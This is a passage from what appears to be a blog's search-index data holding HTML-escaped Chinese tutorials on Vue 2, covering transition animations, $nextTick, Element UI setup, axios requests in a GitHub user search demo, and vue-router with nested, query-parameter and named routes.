&quot;Test&quot;,    data() &#123;return &#123;isShow: true,&#125;&#125;,  &#125;;&lt;/script&gt;&lt;style scoped&gt;  h1 &#123;background-color: orange;&#125;&lt;/style&gt;\n\n使用动画优化 Todo-List案例\n\nsrc/components/MyList.vue\n&lt;template&gt;  &lt;ul class=&quot;todo-main&quot;&gt;    &lt;transition-group name=&quot;todo&quot; appear&gt;      &lt;MyItem v-for=&quot;todoObj of todoList&quot; :key=&quot;todoObj.id&quot; :todoObj=&quot;todoObj&quot;/&gt;    &lt;/transition-group&gt;  &lt;/ul&gt;&lt;/template&gt;&lt;script&gt;  import MyItem from &quot;./MyItem.vue&quot;;  export default &#123;    name: &quot;MyList&quot;,    components: &#123; MyItem &#125;,    props: [&quot;todoList&quot;],  &#125;;&lt;/script&gt;&lt;style scoped&gt;  /*main*/  .todo-main &#123;margin-left: 0px;border: 1px solid #ddd;border-radius: 2px;padding: 0px;&#125;  .todo-empty &#123;height: 40px;line-height: 40px;border: 1px solid #ddd;border-radius: 2px;    padding-left: 5px;margin-top: 10px;&#125;  .todo-enter-active &#123;    animation: atguigu 0.5s linear;  &#125;  .todo-leave-active &#123;    animation: atguigu 0.5s linear reverse;  &#125;  @keyframes atguigu &#123;    from &#123;      transform: translateX(100%);    &#125;    to &#123;      transform: translateX(0px);    &#125;  &#125;&lt;/style&gt;\n\n","categories":["Vue"],"tags":["Vue CLI","过渡与动画"]},{"title":"Vue（二十二）：Vue脚手架之nextTick","url":"/2022/04/11/Vue%EF%BC%88%E4%BA%8C%E5%8D%81%E4%BA%8C%EF%BC%89%EF%BC%9AVue%E8%84%9A%E6%89%8B%E6%9E%B6%E4%B9%8BnextTick/","content":"$nextTick\n这是一个生命周期钩子\n\n\n语法：this.$nextTick(回调函数)\n作用：在下一次DOM更新结束后执行其指定的回调\n什么时候用：当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行\n\n使用 $nextTick 优化 Todo-List案例src/components/MyItem.vue\n&lt;template&gt;  &lt;li&gt;    &lt;label&gt;      &lt;input type=&quot;checkbox&quot; :checked=&quot;todo.done&quot; @change=&quot;handleCheck(todo.id)&quot;/&gt;      &lt;span v-show=&quot;!todo.isEdit&quot;&gt;&#123;&#123; todo.title &#125;&#125;&lt;/span&gt;      &lt;input type=&quot;text&quot; v-show=&quot;todo.isEdit&quot; :value=&quot;todo.title&quot;        @blur=&quot;handleBlur(todo, $event)&quot; ref=&quot;inputTitle&quot;/&gt;    &lt;/label&gt;    &lt;button class=&quot;btn btn-danger&quot; @click=&quot;handleDelete(todo.id)&quot;&gt;删除&lt;/button&gt;    &lt;button v-show=&quot;!todo.isEdit&quot; class=&quot;btn btn-edit&quot; @click=&quot;handleEdit(todo)&quot;&gt;      编辑    &lt;/button&gt;  &lt;/li&gt;&lt;/template&gt;&lt;script&gt;export default &#123;  name: &quot;MyItem&quot;,    props: [&quot;todo&quot;],\t// 声明接收todo  methods: &#123;    handleCheck(id) &#123;\t\t// 勾选or取消勾选      // 通知App组件将对应的todo对象的done值取反      // this.checkTodo(id)      this.$bus.$emit(&quot;checkTodo&quot;, id);    &#125;,    handleDelete(id) &#123;\t// 删除      if (confirm(&quot;确定删除吗？&quot;)) &#123;        // 通知App组件将对应的todo对象删除        // this.deleteTodo(id)        this.$bus.$emit(&#x27;deleteTodo&#x27;,id)      &#125;    &#125;,    handleEdit(todo) &#123;\t// 编辑      if (todo.hasOwnProperty(&quot;isEdit&quot;)) &#123;        todo.isEdit = true;      &#125; else &#123;        this.$set(todo, &quot;isEdit&quot;, true);      &#125;      this.$nextTick(function () &#123;        this.$refs.inputTitle.focus();      &#125;);    &#125;,    handleBlur(todo, e) &#123;\t// 失去焦点回调（真正执行修改逻辑）      todo.isEdit = false;      if (!e.target.value.trim()) return alert(&quot;输入不能为空！&quot;);      this.$bus.$emit(&quot;updateTodo&quot;, todo.id, e.target.value);    &#125;,  &#125;,&#125;;&lt;/script&gt;\n\n","categories":["Vue"],"tags":["Vue CLI","nextTick"]},{"title":"Vue（二十九）：VueUI组件库","url":"/2022/04/13/Vue%EF%BC%88%E4%BA%8C%E5%8D%81%E4%B9%9D%EF%BC%89%EF%BC%9AVueUI%E7%BB%84%E4%BB%B6%E5%BA%93/","content":"移动端常用UI组件库\nVant\nCube UI\nMint UI\nnutui（京东）\n\nPC端常用UI组件库\nElement UI（饿了么）\nIView UI\n\nelement-ui基本使用\n安装 element-ui：npm i element-ui -S\n\nsrc/main.js\nimport Vue from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;import ElementUI from &#x27;element-ui&#x27;;\t\t\t\t\t\t\t// 引入ElementUI组件库import &#x27;element-ui/lib/theme-chalk/index.css&#x27;;\t// 引入ElementUI全部样式Vue.config.productionTip = falseVue.use(ElementUI)\t// 使用ElementUInew Vue(&#123;    el:&quot;#app&quot;,    render: h =&gt; h(App),&#125;)\n\nsrc/App.vue\n&lt;template&gt;\t&lt;div&gt;\t\t&lt;br&gt;\t\t&lt;el-row&gt;\t\t\t&lt;el-button icon=&quot;el-icon-search&quot; circle&gt;&lt;/el-button&gt;\t\t\t&lt;el-button type=&quot;primary&quot; icon=&quot;el-icon-edit&quot; circle&gt;&lt;/el-button&gt;\t\t\t&lt;el-button type=&quot;success&quot; icon=&quot;el-icon-check&quot; circle&gt;&lt;/el-button&gt;\t\t\t&lt;el-button type=&quot;info&quot; icon=&quot;el-icon-message&quot; circle&gt;&lt;/el-button&gt;\t\t\t&lt;el-button type=&quot;warning&quot; icon=&quot;el-icon-star-off&quot; circle&gt;&lt;/el-button&gt;\t\t\t&lt;el-button type=&quot;danger&quot; icon=&quot;el-icon-delete&quot; circle&gt;&lt;/el-button&gt;\t\t&lt;/el-row&gt;\t&lt;/div&gt;&lt;/template&gt;&lt;script&gt;\texport default &#123;\t\tname:&#x27;App&#x27;,\t&#125;&lt;/script&gt;\n\nelement-ui按需引入\n安装 babel-plugin-component：npm i babel-plugin-component -D\n\n修改 babel.config.js\nmodule.exports = &#123;  presets: [    &#x27;@vue/cli-plugin-babel/preset&#x27;,    [&quot;@babel/preset-env&quot;, &#123; &quot;modules&quot;: false &#125;]  ],  plugins: [    [      &quot;component&quot;,      &#123;                &quot;libraryName&quot;: &quot;element-ui&quot;,        &quot;styleLibraryName&quot;: &quot;theme-chalk&quot;      &#125;    ]  ]&#125;\n\nsrc/main.js\nimport Vue from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;import &#123; Button,Row &#125; from &#x27;element-ui&#x27;\t// 按需引入Vue.config.productionTip = falseVue.component(Button.name, Button);Vue.component(Row.name, Row);/* 或写为 * Vue.use(Button) * Vue.use(Row) */new Vue(&#123;    el:&quot;#app&quot;,    render: h =&gt; h(App),&#125;)\n\n","categories":["Vue"],"tags":["UI"]},{"title":"Vue（二十五）：Vue中的ajax","url":"/2022/04/11/Vue%EF%BC%88%E4%BA%8C%E5%8D%81%E4%BA%94%EF%BC%89%EF%BC%9AVue%E4%B8%AD%E7%9A%84ajax/","content":"解决开发环境Ajax跨域问题\n使用代理服务器\nVue（二十四）：Vue脚手架之配置代理\n\nvue项目中常用的Ajax库：axios\n\n\ngithub用户搜索案例public/index.html\n&lt;!DOCTYPE html&gt;&lt;html lang=&quot;&quot;&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;!-- 针对IE浏览器的特殊配置，含义是让IE浏览器以最高渲染级别渲染页面 --&gt;        &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;        &lt;!-- 开启移动端的理想端口 --&gt;        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;        &lt;!-- 配置页签图标 --&gt;        &lt;link rel=&quot;icon&quot; href=&quot;&lt;%= BASE_URL %&gt;favicon.ico&quot;&gt;              &lt;!-- 引入bootstrap样式 --&gt;        &lt;link rel=&quot;stylesheet&quot; href=&quot;&lt;%= BASE_URL %&gt;css/bootstrap.css&quot;&gt;              &lt;!-- 配置网页标题 --&gt;        &lt;title&gt;&lt;%= htmlWebpackPlugin.options.title %&gt;&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;!-- 容器 --&gt;        &lt;div id=&quot;app&quot;&gt;&lt;/div&gt;    &lt;/body&gt;&lt;/html&gt;\n\nsrc/main.js\nimport Vue from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;Vue.config.productionTip = falsenew Vue(&#123;    el:&quot;#app&quot;,    render: h =&gt; h(App),    beforeCreate()&#123;        Vue.prototype.$bus = this    &#125;&#125;)\n\nsrc/App.vue\n&lt;template&gt;  &lt;div class=&quot;container&quot;&gt;    &lt;Search/&gt;    &lt;List/&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  import Search from &#x27;./components/Search.vue&#x27;  import List from &#x27;./components/List.vue&#x27;  export default &#123;    name:&#x27;App&#x27;,    components:&#123; Search, List &#125;,  &#125;&lt;/script&gt;\n\nsrc/components/Search.vue\n&lt;template&gt;  &lt;section class=&quot;jumbotron&quot;&gt;    &lt;h3 class=&quot;jumbotron-heading&quot;&gt;Search Github Users&lt;/h3&gt;    &lt;div&gt;      &lt;input type=&quot;text&quot; placeholder=&quot;enter the name you search&quot; v-model=&quot;keyWord&quot;/&gt;&amp;nbsp;      &lt;button @click=&quot;searchUsers&quot;&gt;Search&lt;/button&gt;    &lt;/div&gt;  &lt;/section&gt;&lt;/template&gt;&lt;script&gt;import axios from &quot;axios&quot;;export default &#123;  name: &quot;Search&quot;,  data() &#123;    return &#123;      keyWord: &quot;&quot;,    &#125;;  &#125;,  methods: &#123;    searchUsers() &#123;      //请求前更新List的数据      this.$bus.$emit(&quot;updateListData&quot;, &#123;        isLoading: true,        errMsg: &quot;&quot;,        users: [],        isFirst: false,      &#125;);      axios.get(`https://api.github.com/search/users?q=$&#123;this.keyWord&#125;`).then(        (response) =&gt; &#123;          console.log(&quot;请求成功了&quot;);          this.$bus.$emit(&quot;updateListData&quot;, &#123;\t//请求成功后更新List的数据            isLoading: false,            errMsg: &quot;&quot;,            users: response.data.items,          &#125;);        &#125;,        (error) =&gt; &#123;          this.$bus.$emit(&quot;updateListData&quot;, &#123;\t//请求后更新List的数据            isLoading: false,            errMsg: error.message,            users: [],          &#125;);        &#125;      );    &#125;,  &#125;,&#125;;&lt;/script&gt;\n\nsrc/components/List.vue\n&lt;template&gt;  &lt;div class=&quot;row&quot;&gt;    &lt;!-- 展示用户列表 --&gt;    &lt;div v-show=&quot;info.users.length&quot; class=&quot;card&quot;          v-for=&quot;user in info.users&quot; :key=&quot;user.login&quot;&gt;      &lt;a :href=&quot;user.html_url&quot; target=&quot;_blank&quot;&gt;        &lt;img :src=&quot;user.avatar_url&quot; style=&quot;width: 100px&quot; /&gt;      &lt;/a&gt;      &lt;p class=&quot;card-text&quot;&gt;&#123;&#123; user.login &#125;&#125;&lt;/p&gt;    &lt;/div&gt;    &lt;!-- 展示欢迎词 --&gt;    &lt;h1 v-show=&quot;info.isFirst&quot;&gt;欢迎使用！&lt;/h1&gt;    &lt;!-- 展示加载中 --&gt;    &lt;h1 v-show=&quot;info.isLoading&quot;&gt;加载中....&lt;/h1&gt;    &lt;!-- 展示错误信息 --&gt;    &lt;h1 v-show=&quot;info.errMsg&quot;&gt;&#123;&#123; info.errMsg &#125;&#125;&lt;/h1&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;  name: &quot;List&quot;,  data() &#123;    return &#123;      info: &#123;        isFirst: true,        isLoading: false,        errMsg: &quot;&quot;,        users: [],      &#125;,    &#125;;  &#125;,  mounted() &#123;    this.$bus.$on(&quot;updateListData&quot;, (dataObj) =&gt; &#123;      this.info = &#123; ...this.info, ...dataObj &#125;;    &#125;);  &#125;,&#125;;&lt;/script&gt;&lt;style scoped&gt;.album &#123;min-height: 50rem; /* Can be removed; just added for demo purposes */  padding-top: 3rem;padding-bottom: 3rem;background-color: #f7f7f7;&#125;.card &#123;float: left;width: 33.333%;padding: 0.75rem;margin-bottom: 2rem;  border: 1px solid #efefef;text-align: center;&#125;.card &gt; img &#123;margin-bottom: 0.75rem;border-radius: 100px;&#125;.card-text &#123;font-size: 85%;&#125;&lt;/style&gt;\n\n\nvue-resource","categories":["Vue"],"tags":["Vue CLI","跨域问题"]},{"title":"Vue（二十八）：Vue路由Router","url":"/2022/04/12/Vue%EF%BC%88%E4%BA%8C%E5%8D%81%E5%85%AB%EF%BC%89%EF%BC%9AVue%E8%B7%AF%E7%94%B1Router/","content":"相关理解vue-router 的理解\nvue的一个插件库，专门用来实现SPA应用\n\n对SPA应用的理解\n单页Web应用（single page web application，SPA）\n整个应用只有一个完整的页面\n点击页面中的导航链接不会刷新页面，只会做页面的局部更新\n数据需要通过ajax请求获取\n\n\n路由的理解什么是路由?\n一个路由就是一组映射关系（key - value）\nkey为路径，value可能是function或componen\n\n路由分类\n后端路由\n理解：value是function，用于处理客户端提交的请求\n工作过程：服务器接收到一个请求时，根据请求路径找到匹配的函数来处理请求，返回响应数据\n\n\n前端路由\n理解：value是component，用于展示页面内容\n工作过程：当浏览器的路径改变时，对应的组件就会显示\n\n\n\n\n基本路由\n安装vue-router，命令npm i vue-router\n\n应用插件Vue.use(VueRouter)\n\n编写router配置项\nimport VueRouter from &#x27;vue-router&#x27;\t\t\t// 引入VueRouterimport About from &#x27;../components/About&#x27;\t// 路由组件import Home from &#x27;../components/Home&#x27;\t\t// 路由组件// 创建router实例对象，去管理一组一组的路由规则const router = new VueRouter(&#123;\troutes:[\t\t&#123;\t\t\tpath:&#x27;/about&#x27;,\t\t\tcomponent:About\t\t&#125;,\t\t&#123;\t\t\tpath:&#x27;/home&#x27;,\t\t\tcomponent:Home\t\t&#125;\t]&#125;)//暴露routerexport default router\n\n实现切换\n\n&lt;router-link&gt;&lt;/router-link&gt;浏览器会被替换为a标签\nactive-class可配置高亮样式\n\n&lt;router-link active-class=&quot;active&quot; to=&quot;/about&quot;&gt;About&lt;/router-link&gt;\n\n指定展示位&lt;router-view&gt;&lt;/router-view&gt;\n\n\n\n代码示例：\nsrc/router/index.js该文件专门用于创建整个应用的路由器\nimport VueRouter from &#x27;vue-router&#x27;// 引入组件import About from &#x27;../components/About&#x27;import Home from &#x27;../components/Home&#x27;// 创建并暴露一个路由器export default new VueRouter(&#123;\troutes:[\t\t&#123;\t\t\tpath:&#x27;/about&#x27;,\t\t\tcomponent:About\t\t&#125;,\t\t&#123;\t\t\tpath:&#x27;/home&#x27;,\t\t\tcomponent:Home\t\t&#125;\t]&#125;)\n\nsrc/main.js\nimport Vue from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;import VueRouter from &#x27;vue-router&#x27;\t// 引入VueRouterimport router from &#x27;./router&#x27;\t\t\t\t// 引入路由器Vue.config.productionTip = falseVue.use(VueRouter)\t// 应用插件new Vue(&#123;\tel:&#x27;#app&#x27;,\trender: h =&gt; h(App),\trouter:router&#125;)\n\nsrc/App.vue\n&lt;template&gt;  &lt;div&gt;    &lt;div class=&quot;row&quot;&gt;      &lt;div class=&quot;col-xs-offset-2 col-xs-8&quot;&gt;        &lt;div class=&quot;page-header&quot;&gt;&lt;h2&gt;Vue Router Demo&lt;/h2&gt;&lt;/div&gt;      &lt;/div&gt;    &lt;/div&gt;    &lt;div class=&quot;row&quot;&gt;      &lt;div class=&quot;col-xs-2 col-xs-offset-2&quot;&gt;        &lt;div class=&quot;list-group&quot;&gt;\t\t\t\t\t&lt;!-- 原始html中我们使用a标签实现页面的跳转 --&gt;          &lt;!-- &lt;a class=&quot;list-group-item active&quot; href=&quot;./about.html&quot;&gt;About&lt;/a&gt; --&gt;          &lt;!-- &lt;a class=&quot;list-group-item&quot; href=&quot;./home.html&quot;&gt;Home&lt;/a&gt; --&gt;\t\t\t\t\t&lt;!-- Vue中借助router-link标签实现路由的切换 --&gt;\t\t\t\t\t&lt;router-link class=&quot;list-group-item&quot;                        active-class=&quot;active&quot; to=&quot;/about&quot;&gt;About&lt;/router-link&gt;          &lt;router-link class=&quot;list-group-item&quot;                        active-class=&quot;active&quot; to=&quot;/home&quot;&gt;Home&lt;/router-link&gt;        &lt;/div&gt;      &lt;/div&gt;      &lt;div class=&quot;col-xs-6&quot;&gt;        &lt;div class=&quot;panel&quot;&gt;          &lt;div class=&quot;panel-body&quot;&gt;\t\t\t\t\t\t&lt;!-- 指定组件的呈现位置 --&gt;            &lt;router-view&gt;&lt;/router-view&gt;          &lt;/div&gt;        &lt;/div&gt;      &lt;/div&gt;    &lt;/div&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;\texport default &#123;\t\tname:&#x27;App&#x27;\t&#125;&lt;/script&gt;\n\nsrc/components/Home.vue\n&lt;template&gt;\t&lt;h2&gt;我是Home的内容&lt;/h2&gt;&lt;/template&gt;&lt;script&gt;\texport default &#123;\t\tname:&#x27;Home&#x27;\t&#125;&lt;/script&gt;\n\nsrc/components/About.vue\n&lt;template&gt;\t&lt;h2&gt;我是About的内容&lt;/h2&gt;&lt;/template&gt;&lt;script&gt;\texport default &#123;\t\tname:&#x27;About&#x27;\t&#125;&lt;/script&gt;\n\n几个注意事项\n路由组件通常存放在pages文件夹，一般组件通常存放在components文件夹\n比如上一节的案例就可以修改为\nsrc/pages/Home.vue \nsrc/pages/About.vue \nsrc/router/index.js \nsrc/components/Banner.vue \nsrc/App.vue\n\n通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载\n\n每个组件都有自己的$route属性，里面存储着自己的路由信息\n\n整个应用只有一个router（路由器），可以通过组件的$router属性获取到\n\n\n// 该文件专门用于创建整个应用的路由器import VueRouter from &quot;vue-router&quot;;import Home from &#x27;../pages/Home&#x27;import About from &#x27;../pages/About&#x27;export default new VueRouter(&#123;    routes:[        &#123;            path:&#x27;/about&#x27;,            component:About        &#125;,        &#123;            path:&#x27;/home&#x27;,            component:Home        &#125;    ]&#125;)\n\n&lt;template&gt;    &lt;div class=&quot;col-xs-offset-2 col-xs-8&quot;&gt;        &lt;div class=&quot;page-header&quot;&gt;&lt;h2&gt;Vue Router Demo&lt;/h2&gt;&lt;/div&gt;    &lt;/div&gt;&lt;/template&gt;&lt;script&gt;    export default &#123;        name:&#x27;Banner&#x27;    &#125;&lt;/script&gt;\n\n&lt;template&gt;  &lt;div&gt;    &lt;div class=&quot;row&quot;&gt;      &lt;Banner/&gt;    &lt;/div&gt;    &lt;div class=&quot;row&quot;&gt;      &lt;div class=&quot;col-xs-2 col-xs-offset-2&quot;&gt;        &lt;div class=&quot;list-group&quot;&gt;          &lt;!-- 原始html中我们使用a标签实现页面跳转 --&gt;          &lt;!-- &lt;a class=&quot;list-group-item active&quot; href=&quot;./about.html&quot;&gt;About&lt;/a&gt;           &lt;a class=&quot;list-group-item&quot; href=&quot;./home.html&quot;&gt;Home&lt;/a&gt; --&gt;          &lt;!-- Vue中借助router-link标签实现路由的切换 --&gt;          &lt;router-link class=&quot;list-group-item&quot; active-class=&quot;active&quot; to=&quot;/about&quot;&gt;            About&lt;/router-link&gt;          &lt;router-link class=&quot;list-group-item&quot; active-class=&quot;active&quot; to=&quot;/home&quot;&gt;            Home&lt;/router-link&gt;\t\t\t\t&lt;/div&gt;\t\t\t&lt;/div&gt;\t\t\t&lt;div class=&quot;col-xs-6&quot;&gt;\t\t\t\t&lt;div class=&quot;panel&quot;&gt;\t\t\t\t\t&lt;div class=&quot;panel-body&quot;&gt;\t\t\t\t\t\t&lt;!-- 指定组件的呈现位置 --&gt;\t\t\t\t\t\t&lt;router-view&gt;&lt;/router-view&gt;\t\t\t\t\t&lt;/div&gt;\t\t\t\t&lt;/div&gt;\t\t\t&lt;/div&gt;\t\t&lt;/div&gt;\t&lt;/div&gt;&lt;/template&gt;&lt;script&gt;\timport Banner from &#x27;./components/Banner.vue&#x27;\texport default &#123;\t\tname:&#x27;App&#x27;,\t\tcomponents:&#123; Banner &#125;\t&#125;&lt;/script&gt;\n\n多级（嵌套）路由\n配置路由规则，使用children配置项\nroutes:[\t&#123;\t\tpath:&#x27;/about&#x27;,\t\tcomponent:About,\t&#125;,\t&#123;\t\tpath:&#x27;/home&#x27;,\t\tcomponent:Home,\t\tchildren:[ \t\t\t\t\t// 通过children配置子级路由\t\t\t&#123;\t\t\t\tpath:&#x27;news&#x27;, \t\t// 此处一定不要带斜杠，写成 /news\t\t\t\tcomponent:News\t\t\t&#125;,\t\t\t&#123;\t\t\t\tpath:&#x27;message&#x27;,\t// 此处一定不要写成 /message\t\t\t\tcomponent:Message\t\t\t&#125;\t\t]\t&#125;]\n\n跳转(要写完整路径)\n&lt;router-link to=&quot;/home/news&quot;&gt;News&lt;/router-link&gt;\n\n\n\n\n代码示例：\nsrc/pages/Home.vue\n&lt;template&gt;\t&lt;div&gt;\t\t&lt;h2&gt;Home组件内容&lt;/h2&gt;\t\t&lt;div&gt;\t\t\t&lt;ul class=&quot;nav nav-tabs&quot;&gt;\t\t\t\t&lt;li&gt;&lt;router-link class=&quot;list-group-item&quot;                        active-class=&quot;active&quot; to=&quot;/home/news&quot;&gt;News&lt;/router-link&gt;&lt;/li&gt;\t\t\t\t&lt;li&gt;&lt;router-link class=&quot;list-group-item&quot;                        active-class=&quot;active&quot; to=&quot;/home/message&quot;&gt;Message&lt;/router-link&gt;&lt;/li&gt;\t\t\t&lt;/ul&gt;\t\t\t&lt;router-view&gt;&lt;/router-view&gt;\t\t&lt;/div&gt;\t&lt;/div&gt;&lt;/template&gt;&lt;script&gt;\texport default &#123;\t\tname:&#x27;Home&#x27;,\t&#125;&lt;/script&gt;\n\nsrc/pages/News.vue\n&lt;template&gt;    &lt;ul&gt;        &lt;li&gt;news001&lt;/li&gt;        &lt;li&gt;news002&lt;/li&gt;        &lt;li&gt;news003&lt;/li&gt;    &lt;/ul&gt;&lt;/template&gt;&lt;script&gt;    export default &#123;        name:&#x27;News&#x27;    &#125;&lt;/script&gt;\n\nsrc/pages/Message.vue\n&lt;template&gt;    &lt;ul&gt;        &lt;li&gt;            &lt;a href=&quot;/message1&quot;&gt;message001&lt;/a&gt;&amp;nbsp;&amp;nbsp;        &lt;/li&gt;        &lt;li&gt;            &lt;a href=&quot;/message2&quot;&gt;message002&lt;/a&gt;&amp;nbsp;&amp;nbsp;        &lt;/li&gt;        &lt;li&gt;            &lt;a href=&quot;/message3&quot;&gt;message003&lt;/a&gt;&amp;nbsp;&amp;nbsp;        &lt;/li&gt;    &lt;/ul&gt;&lt;/template&gt;&lt;script&gt;    export default &#123;        name:&#x27;News&#x27;    &#125;&lt;/script&gt;\n\nsrc/router/index.js\n//该文件专门用于创建整个应用的路由器import VueRouter from &quot;vue-router&quot;;//引入组件import Home from &#x27;../pages/Home&#x27;import About from &#x27;../pages/About&#x27;import News from &#x27;../pages/News&#x27;import Message from &#x27;../pages/Message&#x27;//创建并暴露一个路由器export default new VueRouter(&#123;    routes:[        &#123;            path:&#x27;/about&#x27;,            component:About        &#125;,        &#123;            path:&#x27;/home&#x27;,            component:Home,            children:[                &#123;                    path:&#x27;news&#x27;,                    component:News                &#125;,                &#123;                    path:&#x27;message&#x27;,                    component:Message                &#125;            ]        &#125;    ]&#125;)\n\n路由传参路由的query参数\n传递参数\n&lt;!-- 跳转并携带query参数，to的字符串写法 --&gt;&lt;router-link :to=&quot;`/home/message/detail?id=$&#123;m.id&#125;&amp;title=$&#123;m.title&#125;`&quot;&gt;跳转&lt;/router-link&gt;\t\t\t\t&lt;!-- 跳转并携带query参数，to的对象写法（推荐） --&gt;&lt;router-link \t:to=&quot;&#123;\t\tpath:&#x27;/home/message/detail&#x27;,\t\tquery:&#123;\t\t   id: m.id,       title: m.title\t\t&#125;\t&#125;&quot;&gt;跳转&lt;/router-link&gt;\n\n接收参数\n$route.query.id$route.query.title\n\n\n\n\n代码示例：\nsrc/router.index.js\nimport VueRouter from &quot;vue-router&quot;;import Home from &#x27;../pages/Home&#x27;import About from &#x27;../pages/About&#x27;import News from &#x27;../pages/News&#x27;import Message from &#x27;../pages/Message&#x27;import Detail from &#x27;../pages/Detail&#x27;// 创建并暴露一个路由器export default new VueRouter(&#123;  routes:[    &#123;      path:&#x27;/about&#x27;,      component:About    &#125;,    &#123;      path:&#x27;/home&#x27;,      component:Home,      children:[        &#123;          path:&#x27;news&#x27;,          component:News        &#125;,        &#123;          path:&#x27;message&#x27;,          component:Message,          children:[            &#123;              path:&#x27;detail&#x27;,              component:Detail            &#125;          ]        &#125;      ]    &#125;  ]&#125;)\n\nsrc/pages/Message.vue\n&lt;template&gt;  &lt;div&gt;    &lt;ul&gt;      &lt;li v-for=&quot;m in messageList&quot; :key=&quot;m.id&quot;&gt;        &lt;!-- 跳转路由并携带query参数，to的字符串写法 --&gt;        &lt;!-- &lt;router-link :to=&quot;`/home/message/detail?id=$&#123;m.id&#125;&amp;title=$&#123;m.title&#125;`&quot;&gt;                      &#123;&#123;m.title&#125;&#125;    \t\t\t\t &lt;/router-link&gt;&amp;nbsp;&amp;nbsp; --&gt;        &lt;!-- 跳转路由并携带query参数，to的对象写法 --&gt;        &lt;router-link :to=&quot;&#123;                            path:&#x27;/home/message/detail&#x27;,                            query:&#123;                              id:m.id,                              title:m.title                            &#125;                          &#125;&quot;&gt;          &#123;&#123;m.title&#125;&#125;      &lt;/router-link&gt;&amp;nbsp;&amp;nbsp;      &lt;/li&gt;    &lt;/ul&gt;    &lt;hr/&gt;    &lt;router-view&gt;&lt;/router-view&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  export default &#123;    name:&#x27;News&#x27;,    data()&#123;      return&#123;        messageList:[          &#123;id:&#x27;001&#x27;,title:&#x27;消息001&#x27;&#125;,          &#123;id:&#x27;002&#x27;,title:&#x27;消息002&#x27;&#125;,          &#123;id:&#x27;003&#x27;,title:&#x27;消息003&#x27;&#125;        ]      &#125;    &#125;  &#125;&lt;/script&gt;\n\nsrc/pages/Detail.vue\n&lt;template&gt;    &lt;ul&gt;        &lt;li&gt;消息编号：&#123;&#123; $route.query.id &#125;&#125;&lt;/li&gt;        &lt;li&gt;消息标题：&#123;&#123; $route.query.title &#125;&#125;&lt;/li&gt;    &lt;/ul&gt;&lt;/template&gt;&lt;script&gt;    export default &#123;        name:&#x27;Detail&#x27;    &#125;&lt;/script&gt;\n\n命名路由\n作用：可以简化路由的跳转\n\n如何使用\n\n给路由命名\n&#123;\tpath:&#x27;/demo&#x27;,\tcomponent:Demo,\tchildren:[\t\t&#123;\t\t\tpath:&#x27;test&#x27;,\t\t\tcomponent:Test,\t\t\tchildren:[\t\t\t\t&#123;          name:&#x27;hello&#x27; // 给路由命名\t\t\t\t\tpath:&#x27;welcome&#x27;,\t\t\t\t\tcomponent:Hello,\t\t\t\t&#125;\t\t\t]\t\t&#125;\t]&#125;\n\n简化跳转\n&lt;!--简化前，需要写完整的路径 --&gt;&lt;router-link to=&quot;/demo/test/welcome&quot;&gt;跳转&lt;/router-link&gt;&lt;!--简化后，直接通过名字跳转 --&gt;&lt;router-link :to=&quot;&#123;name:&#x27;hello&#x27;&#125;&quot;&gt;跳转&lt;/router-link&gt;&lt;!--简化写法配合传递参数 --&gt;&lt;router-link \t:to=&quot;&#123;\t\tname:&#x27;hello&#x27;,\t\tquery:&#123;\t\t    id:666,        title:&#x27;你好&#x27;\t\t&#125;\t&#125;&quot;&gt;跳转&lt;/router-link&gt;\n\n代码示例：\nsrc/router/index.js\nimport VueRouter from &quot;vue-router&quot;;import Home from &#x27;../pages/Home&#x27;import About from &#x27;../pages/About&#x27;import News from &#x27;../pages/News&#x27;import Message from &#x27;../pages/Message&#x27;import Detail from &#x27;../pages/Detail&#x27;export default new VueRouter(&#123;    routes:[        &#123;            path:&#x27;/about&#x27;,            component:About        &#125;,        &#123;            path:&#x27;/home&#x27;,            component:Home,            children:[                &#123;                    path:&#x27;news&#x27;,                    component:News                &#125;,                &#123;                    path:&#x27;message&#x27;,                    component:Message,                    children:[                        &#123;                            name:&#x27;detail&#x27;,\t// name配置项为路由命名                            path:&#x27;detail&#x27;,                            component:Detail                        &#125;                    ]                &#125;            ]        &#125;    ]&#125;)\n\nsrc/pages/Message.vue\n&lt;template&gt;    &lt;div&gt;        &lt;ul&gt;            &lt;li v-for=&quot;m in messageList&quot; :key=&quot;m.id&quot;&gt;                &lt;!-- 跳转路由并携带query参数，to的字符串写法 --&gt;                &lt;!-- &lt;router-link :to=&quot;`/home/message/detail?id=$&#123;m.id&#125;&amp;title=$&#123;m.title&#125;`&quot;&gt;                    &#123;&#123;m.title&#125;&#125;                &lt;/router-link&gt;&amp;nbsp;&amp;nbsp; --&gt;                &lt;!-- 跳转路由并携带query参数，to的对象写法 --&gt;                &lt;router-link :to=&quot;&#123;                    name:&#x27;detail&#x27;,\t//使用name进行跳转                    query:&#123;                        id:m.id,                        title:m.title                    &#125;                &#125;&quot;&gt;                    &#123;&#123;m.title&#125;&#125;                &lt;/router-link&gt;&amp;nbsp;&amp;nbsp;            &lt;/li&gt;        &lt;/ul&gt;        &lt;hr/&gt;        &lt;router-view&gt;&lt;/router-view&gt;    &lt;/div&gt;&lt;/template&gt;&lt;script&gt;    export default &#123;        name:&#x27;News&#x27;,        data()&#123;            return&#123;                messageList:[                    &#123;id:&#x27;001&#x27;,title:&#x27;消息001&#x27;&#125;,                    &#123;id:&#x27;002&#x27;,title:&#x27;消息002&#x27;&#125;,                    &#123;id:&#x27;003&#x27;,title:&#x27;消息003&#x27;&#125;                ]            &#125;        &#125;    